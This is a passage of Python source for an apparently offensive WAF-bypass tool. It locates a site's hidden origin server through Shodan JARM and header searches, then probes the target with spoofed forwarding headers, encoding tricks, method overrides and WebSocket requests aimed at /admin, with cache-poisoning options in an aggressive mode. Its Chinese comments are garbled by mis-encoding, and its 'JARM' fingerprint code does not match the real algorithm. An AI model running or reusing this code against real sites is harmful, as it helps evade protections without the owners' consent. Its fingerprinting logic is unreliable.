                    self.logger.info("    [*] [è€—æ—¶æ“ä½œ] æ­£åœ¨é€šè¿‡Shodan APIåæŸ¥JARMæŒ‡çº¹ï¼Œè¿™å¯èƒ½éœ€è¦å‡ åˆ†é’Ÿï¼Œè¯·è€å¿ƒç­‰å¾…...")
                    # å¼‚æ­¥Shodan JARMæœç´¢ - ä¿®å¤é˜»å¡
                    def _sync_jarm_search():
                        query = f'ssl.jarm:{target_jarm}'
                        return self.shodan_client.search(query, limit=50)
                    
                    results = await asyncio.to_thread(_sync_jarm_search)
                    
                    self.logger.info("    [+] JARMåæŸ¥å®Œæˆã€‚")
                    
                    for result in results['matches']:
                        ip = result['ip_str']
                        
                        # è¿‡æ»¤æ‰CDN IP
                        if not self._is_cdn_ip(ip):
                            # äºŒæ¬¡éªŒè¯ï¼šç›´æ¥æµ‹è¯•è¿™ä¸ªIPçš„JARM
                            test_jarm = await self._get_jarm_fingerprint(ip, result.get('port', 443))
                            if test_jarm == target_jarm:
                                servers.append(OriginServer(
                                    ip=ip,
                                    confidence=0.95,  # JARMåŒ¹é…ç½®ä¿¡åº¦æé«˜
                                    discovery_method='jarm_fingerprint',
                                    ports=[result.get('port', 443)],
                                    services={'jarm': target_jarm[:32]}
                                ))
                                self.logger.info(f"[+] JARMæŒ‡çº¹åŒ¹é…ï¼å‘ç°æ½œåœ¨æºç«™: {ip}")
                                
                except shodan.APIError as e:
                    self.logger.error(f"[!] Shodan JARMæœç´¢å¤±è´¥: {e}")
            
            # æœ¬åœ°æ‰«æï¼šæµ‹è¯•å·²çŸ¥IPçš„JARM
            # ä»å…¶ä»–æ–¹æ³•è·å–çš„IPåˆ—è¡¨
            if hasattr(self, '_candidate_ips'):
                for ip in self._candidate_ips:
                    test_jarm = await self._get_jarm_fingerprint(ip, 443)
                    if test_jarm == target_jarm:
                        servers.append(OriginServer(
                            ip=ip,
                            confidence=0.95,
                            discovery_method='jarm_fingerprint_local',
                            ports=[443]
                        ))
                        
        except Exception as e:
            self.logger.error(f"[!] JARMæŒ‡çº¹åˆ†æå¤±è´¥: {type(e).__name__} - {str(e)[:100]}")
        
        return servers
    
    async def _get_jarm_fingerprint(self, host: str, port: int, use_proxy: bool = False) -> Optional[str]:
        """è·å–ä¸»æœºçš„JARMæŒ‡çº¹å®Œæ•´å®ç°"""
        # å…ˆæ£€æŸ¥ç¼“å­˜
        cache_key = f"{host}:{port}"
        if cache_key in self._cache['jarm']:
            cache_entry = self._cache['jarm'][cache_key]
            if time.time() - cache_entry['time'] < self._cache_ttl:
                self._cache_hits += 1
                return cache_entry['result']
        
        try:
            # JARMçš„10ä¸ªç‰¹å®šTLSæ¢é’ˆ
            jarm_probes = [
                # 1. TLS 1.2, no SNI, no ALPN
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_2,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'FORWARD',
                    'use_sni': False,
                    'alpn': None
                },
                # 2. TLS 1.2, SNI, no ALPN
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_2,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'FORWARD',
                    'use_sni': True,
                    'alpn': None
                },
                # 3. TLS 1.2, no SNI, ALPN
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_2,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'FORWARD',
                    'use_sni': False,
                    'alpn': ['h2', 'http/1.1']
                },
                # 4. TLS 1.2, SNI, ALPN, cipher order: reverse
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_2,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'REVERSE',
                    'use_sni': True,
                    'alpn': ['h2', 'http/1.1']
                },
                # 5. TLS 1.2, SNI, ALPN, cipher order: top half
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_2,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'TOP_HALF',
                    'use_sni': True,
                    'alpn': ['h2', 'http/1.1']
                },
                # 6. TLS 1.2, no SNI, no ALPN, cipher order: middle out  
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_2,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'MIDDLE_OUT',
                    'use_sni': False,
                    'alpn': None
                },
                # 7. TLS 1.1, no SNI, no ALPN
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_1,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'FORWARD',
                    'use_sni': False,
                    'alpn': None
                },
                # 8. TLS 1.3, no SNI, no ALPN
                {
                    'tls_version': ssl.PROTOCOL_TLS,  # TLS 1.3
                    'cipher_list': 'TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384',
                    'cipher_order': 'FORWARD',
                    'use_sni': False,
                    'alpn': None,
                    'max_version': ssl.TLSVersion.TLSv1_3
                },
                # 9. TLS 1.3, SNI, no ALPN
                {
                    'tls_version': ssl.PROTOCOL_TLS,
                    'cipher_list': 'TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384',
                    'cipher_order': 'FORWARD',
                    'use_sni': True,
                    'alpn': None,
                    'max_version': ssl.TLSVersion.TLSv1_3
                },
                # 10. TLS 1.2, GREASE values
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_2,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'FORWARD',
                    'use_sni': True,
                    'alpn': ['grease', 'h2', 'http/1.1'],
                    'grease': True
                }
            ]
            
            jarm_results = []
            
            for i, probe in enumerate(jarm_probes):
                try:
                    # åˆ›å»ºSSLä¸Šä¸‹æ–‡
                    context = ssl.SSLContext(probe['tls_version'])
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    # è®¾ç½®æœ€å¤§TLSç‰ˆæœ¬ï¼ˆç”¨äºTLS 1.3ï¼‰
                    if 'max_version' in probe:
                        context.maximum_version = probe['max_version']
                    
                    # è®¾ç½®å¯†ç å¥—ä»¶
                    cipher_list = probe['cipher_list']
                    
                    # å¤„ç†å¯†ç é¡ºåº
                    if probe['cipher_order'] == 'REVERSE':
                        # åè½¬å¯†ç åˆ—è¡¨
                        ciphers = cipher_list.split(':')
                        cipher_list = ':'.join(reversed(ciphers))
                    elif probe['cipher_order'] == 'TOP_HALF':
                        # åªä½¿ç”¨å‰åŠéƒ¨åˆ†
                        ciphers = cipher_list.split(':')
                        cipher_list = ':'.join(ciphers[:len(ciphers)//2])
                    elif probe['cipher_order'] == 'MIDDLE_OUT':
                        # ä»ä¸­é—´å¼€å§‹å‘å¤–æ’åº
                        ciphers = cipher_list.split(':')
                        mid = len(ciphers) // 2
                        reordered = []
                        for i in range(mid):
                            if mid + i < len(ciphers):
                                reordered.append(ciphers[mid + i])
                            if mid - i - 1 >= 0:
                                reordered.append(ciphers[mid - i - 1])
                        cipher_list = ':'.join(reordered)
                    
                    try:
                        context.set_ciphers(cipher_list)
                    except:
                        # å¦‚æœè®¾ç½®å¤±è´¥ï¼Œä½¿ç”¨é»˜è®¤
                        pass
                    
                    # è®¾ç½®ALPN
                    if probe.get('alpn'):
                        try:
                            context.set_alpn_protocols(probe['alpn'])
                        except:
                            pass
                    
                    # å¼‚æ­¥å»ºç«‹è¿æ¥ - ä¿®å¤JARM socketé˜»å¡å’Œä»£ç†æ”¯æŒ
                    async def _jarm_probe_connection():
                        self.logger.debug(f"[JARMè°ƒè¯•] å¼€å§‹æ¢æµ‹: {host}:{port}")
                        self.logger.debug(f"[JARMè°ƒè¯•] ä»£ç†æ¨¡å¼: {use_proxy}")
                        
                        if use_proxy and PROXY_AVAILABLE:
                            # ä»£ç†æ¨¡å¼ - JARMæŒ‡çº¹æ¢æµ‹åœ¨ä»£ç†ä¸‹æ¯”è¾ƒå¤æ‚ï¼Œæš‚æ—¶è·³è¿‡
                            self.logger.debug(f"[JARMè°ƒè¯•] ä»£ç†æ¨¡å¼ä¸‹è·³è¿‡JARMæ¢æµ‹")
                            return None, None, None
                        else:
                            # ç›´è¿æ¨¡å¼ - åŸå§‹JARMæ¢æµ‹
                            def _sync_jarm_connect():
                                self.logger.debug(f"[JARMè°ƒè¯•] ç›´è¿æ¢æµ‹: {host}:{port}")
                                try:
                                    sock = socket.create_connection((host, port), timeout=5)
                                    # SNIè®¾ç½®
                                    server_hostname = host if probe['use_sni'] else None
                                    ssock = context.wrap_socket(sock, server_hostname=server_hostname)
                                    
                                    # æ”¶é›†TLSä¿¡æ¯
                                    cipher = ssock.cipher()
                                    version = ssock.version()
                                    cert = ssock.getpeercert()
                                    
                                    ssock.close()
                                    sock.close()
                                    
                                    self.logger.debug(f"[JARMè°ƒè¯•] æ¢æµ‹æˆåŠŸ")
                                    return cipher, version, cert
                                except ssl.SSLError as e:
                                    self.logger.warning(f"[JARMè°ƒè¯•] SSLæ¡æ‰‹å¤±è´¥: {type(e).__name__}")
                                    raise e
                                except socket.error as e:
                                    self.logger.warning(f"[JARMè°ƒè¯•] å¥—æ¥å­—è¿æ¥å¤±è´¥: {type(e).__name__}")
                                    raise e
                            
                            return await asyncio.to_thread(_sync_jarm_connect)
                    
                    try:
                        cipher, version, cert = await _jarm_probe_connection()
                        
                        # ç”Ÿæˆç»“æœå­—ç¬¦ä¸²
                        result = f"{cipher[0] if cipher else '0'}|{cipher[2] if cipher and len(cipher) > 2 else '0'}|{version}|{'1' if cert else '0'}"
                        jarm_results.append(result)
                        
                    except ssl.SSLError as e:
                        # SSLé”™è¯¯ä¹Ÿæ˜¯æŒ‡çº¹çš„ä¸€éƒ¨åˆ†
                        error_code = getattr(e, 'errno', 0)
                        jarm_results.append(f"error|{error_code}|0|0")
                            
                except socket.timeout:
                    jarm_results.append("timeout|0|0|0")
                except Exception as e:
                    jarm_results.append(f"error|{type(e).__name__}|0|0")
            
            # ç”ŸæˆJARMå“ˆå¸Œ
            jarm_raw = ';'.join(jarm_results)
            
            # JARMä½¿ç”¨ç‰¹å®šçš„å“ˆå¸Œæ–¹æ³•
            # å…ˆSHA256ï¼Œç„¶åæ ¼å¼åŒ–ä¸º JARM æ ¼å¼
            sha256_hash = hashlib.sha256(jarm_raw.encode()).digest()
            
            # è½¬æ¢ä¸ºJARMæ ¼å¼ï¼šå‰30ä¸ªå­—èŠ‚çš„åå…­è¿›åˆ¶ + æœ€å2ä¸ªå­—èŠ‚çš„åå…­è¿›åˆ¶
            jarm_hash = sha256_hash.hex()
            formatted_jarm = f"{jarm_hash[:30]}{jarm_hash[-4:]}"
            
            # ç¼“å­˜ç»“æœ
            self._cache['jarm'][cache_key] = {
                'result': formatted_jarm,
                'time': time.time()
            }
            
            return formatted_jarm
            
        except Exception as e:
            self.logger.warning(f"[!] JARMæŒ‡çº¹è·å–å¤±è´¥ ({host}:{port}): {type(e).__name__} - {str(e)[:50]}")
            return None
    
    async def _find_via_unique_headers(self, url: str, use_proxy: bool = False) -> List[OriginServer]:
        """é€šè¿‡ç‹¬ç‰¹å“åº”å¤´æŸ¥æ‰¾ - å¢å¼ºç‰ˆ"""
        servers = []
        
        try:
            # ä½¿ç”¨ä»£ç†æˆ–ç›´è¿
            if use_proxy and PROXY_AVAILABLE:
                result = await get_proxy_session()
                if result:
                    session, proxy_url = result
                    try:
                        async with session.get(url, ssl=False, proxy=proxy_url) as resp:
                            headers = dict(resp.headers)
                            return await self._process_unique_headers_response(headers, servers)
                    finally:
                        await session.close()
                        return servers
            
            # ç›´è¿æ¨¡å¼
            async with aiohttp.ClientSession() as session:
                async with session.get(url, ssl=False) as resp:
                    headers = dict(resp.headers)
                    
                    # è¿‡æ»¤å‡ºçœŸæ­£ç‹¬ç‰¹çš„å“åº”å¤´
                    common_headers = [
                        'date', 'content-type', 'content-length', 'connection', 
                        'server', 'cache-control', 'expires', 'pragma', 'vary',
                        'accept-ranges', 'etag', 'last-modified', 'x-powered-by',
                        'x-frame-options', 'x-content-type-options', 'strict-transport-security'
                    ]
                    
                    unique_headers = []
                    for header, value in headers.items():
                        header_lower = header.lower()
                        # æ’é™¤å¸¸è§å¤´å’ŒCDNå¤´
                        if (header_lower not in common_headers and 
                            not any(cdn in header_lower for cdn in ['cloudflare', 'akamai', 'fastly', 'cloudfront', 'incapsula'])):
                            # é¢å¤–æ£€æŸ¥ï¼šå€¼å¿…é¡»è¶³å¤Ÿç‹¬ç‰¹ï¼ˆé•¿åº¦>10ä¸”ä¸æ˜¯å¸¸è§å€¼ï¼‰
                            if len(value) > 10 and value not in ['none', 'true', 'false', '0', '1']:
                                unique_headers.append(f'{header}: {value}')
                    
                    if unique_headers and self.shodan_client:
                        # å¼‚æ­¥Shodanå¤´éƒ¨æœç´¢ - ä¿®å¤é˜»å¡
                        async def _search_unique_header(header):
                            try:
                                def _sync_header_search():
                                    query = f'"{header}"'
                                    return self.shodan_client.search(query, limit=5)
                                
                                results = await asyncio.to_thread(_sync_header_search)
                                header_servers = []
                                for result in results['matches']:
                                    ip = result['ip_str']
                                    if not self._is_cdn_ip(ip):
                                        # æ£€æŸ¥æ˜¯å¦çœŸçš„åŒ…å«ç›¸åŒçš„å¤´
                                        if header in str(result):
                                            header_servers.append(OriginServer(
                                                ip=ip,
                                                confidence=0.4,  # é™ä½åˆå§‹ç½®ä¿¡åº¦
                                                discovery_method='unique_headers',
                                                ports=[result.get('port', 80)]
                                            ))
                                return header_servers
                            except:
                                return []
                        
                        # å¹¶å‘æœç´¢æœ€ç‹¬ç‰¹çš„1-2ä¸ªå¤´
                        header_tasks = [_search_unique_header(header) for header in unique_headers[:2]]
                        header_results = await asyncio.gather(*header_tasks, return_exceptions=True)
                        
                        # åˆå¹¶ç»“æœ
                        for result in header_results:
                            if isinstance(result, list):
                                servers.extend(result)
                                
        except Exception as e:
            self.logger.warning(f"[!] å“åº”å¤´æœç´¢å¼‚å¸¸: {type(e).__name__} - {str(e)[:100]}")
        
        return servers
    
    def _build_bypass_strategy(self, waf_type: Optional[str], aggressive: bool) -> List[Dict]:
        """æ„å»ºç»•è¿‡ç­–ç•¥"""
        strategies = []
        
        # åŸºç¡€ç­–ç•¥ - å§‹ç»ˆå°è¯•
        base_strategies = [
            {'name': 'direct_origin', 'function': self._bypass_via_origin_ip},
            {'name': 'header_manipulation', 'function': self._bypass_via_headers},
            {'name': 'encoding_bypass', 'function': self._bypass_via_encoding},
            {'name': 'method_override', 'function': self._bypass_via_method_override}
        ]
        
        strategies.extend(base_strategies)
        
        # WAFç‰¹å®šç­–ç•¥ - ç§»é™¤å¤æ‚çš„http_smugglingå’Œgraphqlï¼Œé¿å…æ— é™å¾ªç¯
        if waf_type and waf_type in self.waf_signatures:
            priority_methods = self.waf_signatures[waf_type].get('bypass_priority', [])
            for method in priority_methods:
                if method == 'websocket':
                    strategies.append({'name': 'websocket', 'function': self._bypass_via_websocket})
                elif method == 'chunked_encoding':
                    strategies.append({'name': 'chunked', 'function': self._bypass_via_chunked})
                # æ³¨é‡Šæ‰å¤æ‚ç­–ç•¥ï¼Œè¿™äº›å°†åœ¨auto_bypassä¸­å•ç‹¬æ‰§è¡Œ
                # elif method == 'http_smuggling':
                #     strategies.append({'name': 'smuggling', 'function': self._bypass_via_smuggling})
                # elif method == 'graphql':
                #     strategies.append({'name': 'graphql', 'function': self._bypass_via_graphql})
        
        # æ¿€è¿›æ¨¡å¼é¢å¤–ç­–ç•¥
        if aggressive:
            aggressive_strategies = [
                {'name': 'cache_poison', 'function': self._bypass_via_cache_poison},
                {'name': 'protocol_confusion', 'function': self._bypass_via_protocol_confusion},
                {'name': 'parameter_pollution', 'function': self._bypass_via_hpp},
                {'name': 'edge_cases', 'function': self._bypass_via_edge_cases}  # æ–°å¢ï¼šè¾¹ç¼˜æ¡ˆä¾‹
            ]
            strategies.extend(aggressive_strategies)
        
        return strategies
    
    def _build_simple_bypass_strategy(self, waf_type: Optional[str], aggressive: bool) -> List[Dict]:
        """æ„å»ºç®€å•ç»•è¿‡ç­–ç•¥ - åªåŒ…å«å•è¯·æ±‚ç±»å‹ï¼Œé¿å…å¤æ‚æ‰«æå™¨çš„æ— é™å¾ªç¯"""
        strategies = []
        
        # åŸºç¡€ç­–ç•¥ - å§‹ç»ˆå°è¯•
        base_strategies = [
            {'name': 'direct_origin', 'function': self._bypass_via_origin_ip},
            {'name': 'header_manipulation', 'function': self._bypass_via_headers},
            {'name': 'encoding_bypass', 'function': self._bypass_via_encoding},
            {'name': 'method_override', 'function': self._bypass_via_method_override}
        ]
        
        strategies.extend(base_strategies)
        
        # WAFç‰¹å®šçš„ç®€å•ç­–ç•¥ - æ’é™¤å¤æ‚æ‰«æå™¨
        if waf_type and waf_type in self.waf_signatures:
            priority_methods = self.waf_signatures[waf_type].get('bypass_priority', [])
            for method in priority_methods:
                if method == 'websocket':
                    strategies.append({'name': 'websocket', 'function': self._bypass_via_websocket})
                elif method == 'chunked_encoding':
                    strategies.append({'name': 'chunked', 'function': self._bypass_via_chunked})
                # http_smugglingå’Œgraphqlåœ¨auto_bypassä¸­å•ç‹¬æ‰§è¡Œï¼Œä¸åŠ å…¥å¾ªç¯
        
        # æ¿€è¿›æ¨¡å¼çš„ç®€å•ç­–ç•¥
        if aggressive:
            aggressive_strategies = [
                {'name': 'cache_poison', 'function': self._bypass_via_cache_poison},
                {'name': 'protocol_confusion', 'function': self._bypass_via_protocol_confusion},
                {'name': 'parameter_pollution', 'function': self._bypass_via_hpp},
                {'name': 'edge_cases', 'function': self._bypass_via_edge_cases}
            ]
            strategies.extend(aggressive_strategies)
        
        return strategies
    
    async def _execute_bypass_strategy(self, url: str, strategy: Dict, 
                                     origin_servers: List[OriginServer]) -> BypassResult:
        """æ‰§è¡Œå•ä¸ªç»•è¿‡ç­–ç•¥"""
        try:
            self.logger.info(f"[*] å°è¯•ç»•è¿‡æ–¹æ³•: {strategy['name']}")
            
            # ä¼ é€’æºç«™ä¿¡æ¯ç»™éœ€è¦çš„ç­–ç•¥
            if strategy['name'] == 'direct_origin':
                result = await strategy['function'](url, origin_servers)
            else:
                result = await strategy['function'](url)
            
            if result.success:
                self.logger.info(f"[+] ç»•è¿‡æˆåŠŸ: {strategy['name']}")
            else:
                self.logger.warning(f"[-] ç»•è¿‡å¤±è´¥: {strategy['name']} - {result.details.get('error', 'æœªçŸ¥åŸå› ')}")
            
            return result
            
        except Exception as e:
            self.logger.error(f"[!] ç­–ç•¥æ‰§è¡Œå¤±è´¥ {strategy['name']}: {type(e).__name__} - {e}")
            return BypassResult(
                success=False,
                method=strategy['name'],
                url=url,
                details={'error': f'ç­–ç•¥æ‰§è¡Œå¼‚å¸¸: {type(e).__name__} - {str(e)}'}
            )
    
    async def _bypass_via_origin_ip(self, url: str, origin_servers: List[OriginServer]) -> BypassResult:
        """ç›´è¿æºç«™IPç»•è¿‡"""
        if not origin_servers:
            return BypassResult(
                success=False,
                method='direct_origin',
                url=url,
                details={'error': 'No origin servers found'}
            )
        
        domain = self._extract_domain(url)
        
        for server in origin_servers:
            if server.confidence < 0.5:  # è·³è¿‡ä½ç½®ä¿¡åº¦çš„æœåŠ¡å™¨
                continue
                
            try:
                # æ„å»ºç›´è¿URL
                parsed = urllib.parse.urlparse(url)
                direct_url = f"{parsed.scheme}://{server.ip}{parsed.path}"
                if parsed.query:
                    direct_url += f"?{parsed.query}"
                
                # æµ‹è¯•ç›´è¿
                async with aiohttp.ClientSession() as session:
                    headers = {
                        'Host': domain,
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                    
                    async with session.get(
                        direct_url,
                        headers=headers,
                        ssl=False,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        if resp.status == 200:
                            content = await resp.text()
                            # éªŒè¯æ˜¯å¦çœŸçš„æ˜¯ç›®æ ‡ç«™ç‚¹
                            if domain in content or parsed.hostname in content:
                                result = BypassResult(
                                    success=True,
                                    method='direct_origin',
                                    url=direct_url,
                                    details={
                                        'origin_ip': server.ip,
                                        'confidence': server.confidence,
                                        'discovery_method': server.discovery_method,
                                        'content': content,
                                        'headers': dict(resp.headers)
                                    },
                                    confidence=0.5  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                                )
                                # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                                result.confidence = self.scorer.assess(result)
                                return result
            except:
                continue
        
        return BypassResult(
            success=False,
            method='direct_origin',
            url=url,
            details={
                'error': f'æ‰€æœ‰æºç«™ç›´è¿å°è¯•å¤±è´¥ï¼Œå…±æµ‹è¯•{len(origin_servers)}ä¸ªæºç«™IP',
                'tested_servers': [f"{s.ip} (ç½®ä¿¡åº¦: {s.confidence:.1%})" for s in origin_servers],
                'confidence_threshold': 0.5,
                'failure_reason': 'direct_connection_blocked_or_invalid_servers'
            }
        )
    
    async def _bypass_via_headers(self, url: str) -> BypassResult:
        """é€šè¿‡è¯·æ±‚å¤´æ“çºµç»•è¿‡"""
        test_headers = [
            self.bypass_headers.copy(),
            {
                'X-Originating-IP': '127.0.0.1',
                'X-Forwarded-For': '127.0.0.1,10.0.0.1,172.16.0.1',
                'X-Real-IP': '10.0.0.1'
            },
            {
                'X-Forwarded-For': '127.0.0.1',
                'X-Forwarded-Host': 'localhost',
                'X-Rewrite-URL': url
            }
        ]
        
        async with aiohttp.ClientSession() as session:
            for headers in test_headers:
                try:
                    async with session.get(
                        url,
                        headers=headers,
                        ssl=False,
                        allow_redirects=False
                    ) as resp:
                        if resp.status in [200, 301, 302]:
                            content = await resp.text()
                            # æ£€æŸ¥æ˜¯å¦çœŸçš„ç»•è¿‡äº†WAF
                            if not any(waf_sig in content.lower() 
                                     for waf_sig in ['cloudflare', 'access denied', 'forbidden']):
                                result = BypassResult(
                                    success=True,
                                    method='header_manipulation',
                                    url=url,
                                    details={
                                        'headers_used': headers,
                                        'content': content,
                                        'headers': dict(resp.headers)
                                    },
                                    confidence=0.5  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                                )
                                # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                                result.confidence = self.scorer.assess(result)
                                return result
                except:
                    continue
        
        return BypassResult(
            success=False,
            method='header_manipulation',
            url=url
        )
    
    async def _bypass_via_encoding(self, url: str) -> BypassResult:
        """é€šè¿‡ç¼–ç ç»•è¿‡"""
        parsed = urllib.parse.urlparse(url)
        
        # å‡†å¤‡å„ç§ç¼–ç çš„payload
        if parsed.query:
            # å¯¹æŸ¥è¯¢å‚æ•°è¿›è¡Œå„ç§ç¼–ç 
            params = urllib.parse.parse_qs(parsed.query)
            
            encoding_tests = []
            for encoder_name, encoder_func in self.encoders.items():
                encoded_params = {}
                for key, values in params.items():
                    encoded_params[encoder_func(key)] = [encoder_func(v) for v in values]
                
                # é‡æ„URL
                encoded_query = urllib.parse.urlencode(encoded_params, doseq=True)
                encoded_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{encoded_query}"
                encoding_tests.append((encoder_name, encoded_url))
        else:
            # å¯¹è·¯å¾„è¿›è¡Œç¼–ç 
            encoding_tests = []
            for encoder_name, encoder_func in self.encoders.items():
                if parsed.path and len(parsed.path) > 1:
                    encoded_path = encoder_func(parsed.path)
                    encoded_url = f"{parsed.scheme}://{parsed.netloc}{encoded_path}"
                    encoding_tests.append((encoder_name, encoded_url))
        
        # æµ‹è¯•å„ç§ç¼–ç 
        async with aiohttp.ClientSession() as session:
            for encoder_name, encoded_url in encoding_tests:
                try:
                    async with session.get(
                        encoded_url,
                        headers=self.bypass_headers,
                        ssl=False
                    ) as resp:
                        if resp.status == 200:
                            content = await resp.text()
                            result = BypassResult(
                                success=True,
                                method='encoding_bypass',
                                url=encoded_url,
                                details={
                                    'encoding': encoder_name,
                                    'content': content,
                                    'headers': dict(resp.headers)
                                },
                                confidence=0.5  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                            )
                            # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                            result.confidence = self.scorer.assess(result)
                            return result
                except:
                    continue
        
        return BypassResult(
            success=False,
            method='encoding_bypass',
            url=url
        )
    
    async def _bypass_via_method_override(self, url: str) -> BypassResult:
        """é€šè¿‡HTTPæ–¹æ³•è¦†ç›–ç»•è¿‡"""
        override_headers = [
            {'X-HTTP-Method-Override': 'GET'},
            {'X-HTTP-Method': 'GET'},
            {'X-Method-Override': 'GET'},
            {'_method': 'GET'}
        ]
        
        async with aiohttp.ClientSession() as session:
            # å°è¯•ç”¨POSTè¯·æ±‚é…åˆæ–¹æ³•è¦†ç›–å¤´
            for headers in override_headers:
                try:
                    headers.update(self.bypass_headers)
                    async with session.post(
                        url,
                        headers=headers,
                        ssl=False
                    ) as resp:
                        if resp.status == 200:
                            content = await resp.text()
                            result = BypassResult(
                                success=True,
                                method='method_override',
                                url=url,
                                details={
                                    'override_header': headers,
                                    'content': content,
                                    'headers': dict(resp.headers)
                                },
                                confidence=0.5  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                            )
                            # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                            result.confidence = self.scorer.assess(result)
                            return result
                except:
                    continue
        
        return BypassResult(
            success=False,
            method='method_override',
            url=url
        )
    
    async def _bypass_via_websocket(self, url: str) -> BypassResult:
        """é€šè¿‡WebSocketç»•è¿‡å®Œæ•´å®ç°"""
        parsed = urllib.parse.urlparse(url)
        ws_scheme = 'wss' if parsed.scheme == 'https' else 'ws'
        
        # WebSocketç»•è¿‡æŠ€æœ¯
        websocket_techniques = [
            # 1. ç›´æ¥WebSocketå‡çº§
            {
                'name': 'direct_upgrade',
                'url': f"{ws_scheme}://{parsed.netloc}{parsed.path or '/'}",
                'headers': {
                    'Upgrade': 'websocket',
                    'Connection': 'Upgrade',
                    'Sec-WebSocket-Version': '13',
                    'Sec-WebSocket-Key': base64.b64encode(os.urandom(16)).decode()
                }
            },
            # 2. ä¼ªè£…HTTPè¯·æ±‚ä¸ºWebSocketæ¶ˆæ¯
            {
                'name': 'http_over_ws',
                'url': f"{ws_scheme}://{parsed.netloc}/",
                'payload': f"GET {parsed.path or '/admin'} HTTP/1.1\r\nHost: {parsed.netloc}\r\n\r\n"
            },
            # 3. Socket.IOç»•è¿‡
            {
                'name': 'socketio',
                'url': f"{ws_scheme}://{parsed.netloc}/socket.io/?transport=websocket",
                'headers': {
                    'Origin': f"{parsed.scheme}://{parsed.netloc}"
                }
            },
            # 4. å­åè®®ç»•è¿‡
            {
                'name': 'subprotocol',
                'url': f"{ws_scheme}://{parsed.netloc}{parsed.path or '/'}",
                'subprotocols': ['http', 'xmpp', 'mqtt']
            }
        ]
        
        async with aiohttp.ClientSession() as session:
            for technique in websocket_techniques:
                try:
                    ws_url = technique['url']
                    
                    # æ„å»ºWebSocketè¿æ¥å‚æ•°
                    ws_kwargs = {
                        'ssl': False,
                        'timeout': aiohttp.ClientTimeout(total=10)
                    }
                    
                    # æ·»åŠ ç‰¹å®šå¤´éƒ¨
                    if 'headers' in technique:
                        ws_kwargs['headers'] = technique['headers']
                    
                    # æ·»åŠ å­åè®®
                    if 'subprotocols' in technique:
                        ws_kwargs['protocols'] = technique['subprotocols']
                    
                    # å°è¯•å»ºç«‹WebSocketè¿æ¥
                    async with session.ws_connect(ws_url, **ws_kwargs) as ws:
                        self.logger.info(f"[+] WebSocketè¿æ¥æˆåŠŸ: {technique['name']}")
                        
                        # æ ¹æ®ä¸åŒæŠ€æœ¯å‘é€ä¸åŒpayload
                        if technique['name'] == 'http_over_ws':
                            # å‘é€HTTPè¯·æ±‚ä¼ªè£…æˆWebSocketæ¶ˆæ¯
                            await ws.send_str(technique['payload'])
                            
                            # ç­‰å¾…å“åº”
                            try:
                                msg = await asyncio.wait_for(ws.receive(), timeout=3)
                                if msg.type == aiohttp.WSMsgType.TEXT:
                                    response = msg.data
                                    
                                    # æ£€æŸ¥æ˜¯å¦æˆåŠŸè®¿é—®åˆ°ç›®æ ‡
                                    if 'HTTP/' in response or 'admin' in response.lower():
                                        await ws.close()
                                        result = BypassResult(
                                            success=True,
                                            method='websocket',
                                            url=ws_url,
                                            details={
                                                'technique': technique['name'],
                                                'response_preview': response[:200],
                                                'content': response,
                                                'headers': {}
                                            },
                                            confidence=0.5,  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                                            risk_level='medium'
                                        )
                                        # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                                        result.confidence = self.scorer.assess(result)
                                        return result
                            except asyncio.TimeoutError:
                                pass
                        
                        elif technique['name'] == 'direct_upgrade':
                            # æµ‹è¯•æ˜¯å¦å¯ä»¥é€šè¿‡WebSocketè®¿é—®å—é™èµ„æº
                            test_payloads = [
                                {'action': 'get', 'path': '/admin'},
                                {'cmd': 'fetch', 'resource': parsed.path or '/'},
                                f"GET:{parsed.path or '/admin'}"
                            ]
                            
                            for payload in test_payloads:
                                if isinstance(payload, dict):
                                    await ws.send_json(payload)
                                else:
                                    await ws.send_str(payload)
                                
                                try:
                                    msg = await asyncio.wait_for(ws.receive(), timeout=2)
                                    if msg.type in [aiohttp.WSMsgType.TEXT, aiohttp.WSMsgType.BINARY]:
                                        data = msg.data if msg.type == aiohttp.WSMsgType.TEXT else msg.data.decode('utf-8', errors='ignore')
                                        
